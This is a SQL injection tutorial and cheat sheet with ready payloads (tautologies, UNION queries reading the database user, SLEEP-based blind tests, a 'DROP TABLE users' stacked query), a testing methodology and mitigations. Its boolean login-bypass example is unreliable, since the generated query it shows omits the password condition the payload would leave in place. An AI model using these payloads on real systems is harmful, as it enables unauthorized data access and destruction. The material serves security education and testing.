### Sql Injection:

SQL Injection (SQLi) is a prevalent web application vulnerability that allows attackers to interfere with the queries an application makes to its database. This can lead to unauthorized access to sensitive data, bypassing authentication, or even executing administrative operations on the database. SQL injection occurs when untrusted input is concatenated directly into a SQL query without proper sanitization.

SQL injection attacks typically happen in places where user input is processed, such as search fields, login forms, URLs, or even HTTP headers.

---

### Types of SQL Injection:

1. **In-band SQL Injection**:
    - **Classic SQL Injection** (Error-based): The attacker receives direct feedback from the database via error messages.
    - **Union-based SQL Injection**: Leverages the `UNION` SQL operator to join malicious queries with the original one.
2. **Inferential SQL Injection (Blind SQLi)**:
    - **Boolean-based Blind SQLi**: The application behavior changes based on true/false conditions injected in the SQL query.
    - **Time-based Blind SQLi**: Exploits time delays as a means to infer whether the query was executed successfully.
3. **Out-of-band SQL Injection**: Leverages external channels (e.g., HTTP requests or DNS requests) to send data out from the vulnerable application.

---

### Injection Points

- **URL Parameters**: `http://example.com/user?id=1`
- **Form Fields**: Login, search, and comment forms
- **HTTP Headers**: `User-Agent`, `Referer`, `Cookie`
- **JSON/XML Input**: Used in RESTful APIs
- **File Upload Names**: Metadata fields in file uploads

---

### Common SQL Injection Payloads:

1. **Basic SQL Injection Test**
Inject an apostrophe (`'`) or double quote (`"`) to test for syntax errors:
    
    ```
    SELECT * FROM users WHERE username = 'admin';
    
    ```
    
    Payload:
    
    ```
    admin'--
    
    ```
    
    If the database error message is returned, it could indicate that SQL injection is possible.
    
2. **Union-Based SQL Injection**
Attempt to inject a `UNION` query to retrieve data from another table:
    
    ```
    ' UNION SELECT null, database(), user()--
    
    ```
    
    This payload checks if you can retrieve the database name and current user.
    
3. **Boolean-Based Blind SQL Injection**
Alter the query with conditional logic:
    
    ```
    ' OR 1=1--
    
    ```
    
    If the response indicates a positive outcome (e.g., login success or data being shown), this suggests SQL injection is possible.
    
4. **Time-Based Blind SQL Injection**
Introduce time delays into the query:
    
    ```
    ' OR IF(1=1, SLEEP(5), 0)--
    
    ```
    
    If the page takes longer to load, it indicates the injection was successful.
    

---

### Detailed Attack Scenarios:

### 1. **Classic Error-Based SQL Injection**

If a web application displays detailed error messages, this could reveal database structures. These error messages often contain SQL query syntax errors, providing the attacker with valuable information for further exploitation.

**Example:**

The input is passed directly into the SQL query:

```sql
SELECT * FROM products WHERE id = '$id';

```

Payload:

```
1' OR '1' = '1

```

Generated SQL query:

```sql
SELECT * FROM products WHERE id = '1' OR '1' = '1';

```

Effect: Returns all rows because the condition always evaluates to true (`'1' = '1'`).

---

### 2. **Union-Based SQL Injection**

This method uses the `UNION` operator to combine the results of two queries. The attacker can craft a second query that returns arbitrary data.

**Example:**
Original query:

```sql
SELECT id, name, price FROM products WHERE category = '$category';

```

Payload:

```
' UNION SELECT NULL, user(), NULL--

```

Generated SQL query:

```sql
SELECT id, name, price FROM products WHERE category = '' UNION SELECT NULL, user(), NULL;

```

Effect: Displays the current database user instead of the product details.

---

### 3. **Boolean-Based Blind SQL Injection**

Boolean-based blind SQL injection relies on observing the application's behavior when injecting a condition that results in true or false outcomes.

**Example:**
Original query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';

```

Payload:

```
admin' AND '1'='1

```

Generated SQL query:

```sql
SELECT * FROM users WHERE username = 'admin' AND '1'='1';

```

Effect: The query executes successfully and the user logs in as "admin".

---

### 4. **Time-Based Blind SQL Injection**

Time-based SQL injection doesn’t produce visible results but affects the time taken to respond. The attacker executes queries that cause delays to infer whether the query was successful.

**Example:**
Original query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';

```

Payload:

```
admin' OR IF(1=1, SLEEP(5), 0)--

```

Generated SQL query:

```sql
SELECT * FROM users WHERE username = 'admin' OR IF(1=1, SLEEP(5), 0);

```

Effect: The page will take at least 5 seconds to load if the SQL query was executed, confirming a successful SQL injection.

---

### Advanced SQL Injection Techniques:

1. **Second Order SQL Injection**:
    - This occurs when user input is stored and then used in a future query. For instance, if the input is sanitized during the initial submission but later used in a vulnerable SQL query.
2. **SQL Injection in LIMIT/OFFSET**:
    - SQL injections can sometimes be exploited within `LIMIT` and `OFFSET` clauses.
    - Example payload:
        
        ```sql
        0 UNION ALL SELECT 1,2,3--
        
        ```
        
3. **Stacked Queries**:
    - Some databases (like PostgreSQL and Microsoft SQL Server) allow stacking queries (i.e., running multiple queries in one go).
    - Example payload:
    In this case, the first query runs normally, and the second query (`DROP TABLE`) deletes the `users` table.
        
        ```sql
        1; DROP TABLE users--
        
        ```
        

---

### SQL Injection Testing Methodology:

1. **Identify Potential Entry Points**:
    - Scan all user input fields (URLs, form parameters, HTTP headers, etc.)
    - Fuzz input fields with special characters (`'`, `"`, `-`, `;`) to detect SQL errors or unexpected behavior.
2. **Error-Based Testing**:
    - Inject simple payloads like `'` or `"` to identify whether the application is vulnerable to error-based SQLi. Observe for SQL errors or any anomaly in output.
    - Check the response for database error messages such as `You have an error in your SQL syntax`.
3. **Union Testing**:
    - Test for `UNION`based SQL injection by injecting payloads like:
    Then, adjust the number of `NULL` values to match the number of columns in the original query.
        
        ```sql
        ' UNION SELECT NULL, NULL, NULL--
        
        ```
        
4. **Blind SQL Injection Testing**:
    - Use boolean-based payloads:
    Compare the responses to determine if the application behavior changes based on true/false conditions.
        
        ```sql
        ' AND 1=1--
        ' AND 1=2--
        
        ```
        
5. **Time-Based Testing**:
    - Use time delays to confirm blind SQLi:
    Observe if the response time increases, indicating that the query was processed.
        
        ```sql
        ' OR IF(1=1, SLEEP(5), 0)--
        
        ```
        
6. **Testing HTTP Headers and Cookies**:
    - Inject payloads into HTTP headers like `User-Agent`, `Referer`, or `Cookie` fields to test for SQLi vulnerabilities.

---

### Mitigation & Best Practices:

1. **Use Parameterized Queries (Prepared Statements)**:
    - Example (in PHP):
    Prepared statements ensure that user input is treated as data, not as executable code.
        
        ```php
        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
        $stmt->execute(['username' => $username]);
        
        ```
        
2. **Input Validation**:
    - Validate and sanitize all user inputs. Disallow dangerous characters such as `;`, `'`, and `-`.
3. **Use ORM/Frameworks**:
    - Use object-relational mapping (ORM) tools or web frameworks that automatically escape user inputs.
4. **Least Privilege Principle**:
    - Ensure that the database user has the minimum permissions necessary to perform the task. For example, the application user should not have `DROP` or `ALTER` privileges.
5. **Web Application Firewalls (WAFs)**:
    - Use WAFs to detect and block malicious SQL queries.

---

### Testing Tools:

- **SQLMap**: Automates the detection and exploitation of SQL injection vulnerabilities.
- **Burp Suite**: A comprehensive web vulnerability scanner with support for SQLi.
- **Havij**: Another automated SQLi tool designed to extract data.

---
